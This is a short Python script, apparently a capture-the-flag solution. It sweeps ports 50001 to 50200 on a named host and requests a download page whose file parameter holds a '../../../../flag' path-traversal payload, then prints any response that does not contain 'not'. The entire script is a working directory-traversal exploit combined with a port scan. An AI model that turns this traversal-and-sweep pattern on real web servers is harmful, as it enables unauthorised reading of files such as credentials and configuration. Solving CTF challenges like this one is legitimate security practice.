import requests

def my_request(port):
	url = f"http://b.rubiya.kr:{port}/main.php?page=download&file=../../../../flag"
	response = requests.get(url)
	return response


def solve():
	for port in range(50001,50201):
		response = my_request(port)
		if "not" not in response.text:
			print(response.text)

if __name__ == "__main__":
	solve()
